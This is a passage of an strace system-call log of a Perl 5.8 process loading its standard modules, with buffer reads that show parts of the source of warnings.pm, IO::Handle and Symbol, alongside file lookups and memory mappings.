\"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12318 07:41:50.077398 brk(0x81b6000)    = 0x81b6000
12318 07:41:50.077414 brk(0x81b5000)    = 0x81b5000
12318 07:41:50.077526 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12318 07:41:50.077948 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12318 07:41:50.078721 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12318 07:41:50.078850 read(8, "", 4096) = 0
12318 07:41:50.078863 close(8)          = 0
12318 07:41:50.079059 _llseek(6, 412, [412], SEEK_SET) = 0
12318 07:41:50.079075 _llseek(6, 0, [412], SEEK_CUR) = 0
12318 07:41:50.079086 close(6)          = 0
12318 07:41:50.079126 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12318 07:41:50.079149 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12318 07:41:50.079181 futex(0xb7f3a070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12318 07:41:50.079197 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12318 07:41:50.079211 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12318 07:41:50.079298 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12318 07:41:50.079324 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f3e000
12318 07:41:50.079337 mmap2(0xb7f42000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f42000
12318 07:41:50.079351 close(6)          = 0
12318 07:41:50.079509 stat64("/etc/perl/IO/Handle.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.079558 stat64("/etc/perl/IO/Handle.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.079572 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.079585 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.079599 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.079612 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.079626 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.079637 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.079651 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.079662 stat64("/usr/share/perl5/IO/Handle.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.079675 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.079688 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12318 07:41:50.079709 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.079723 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.079734 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.079751 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12318 07:41:50.080171 stat64("/etc/perl/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080188 stat64("/etc/perl/Symbol.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080201 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080214 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080227 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080243 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080257 stat64("/usr/lib/perl5/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080269 stat64("/usr/lib/perl5/Symbol.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080282 stat64("/usr/share/perl5/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080294 stat64("/usr/share/perl5/Symbol.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080307 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080319 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080333 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080345 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12318 07:41:50.080366 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.080380 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.080391 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.080408 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub 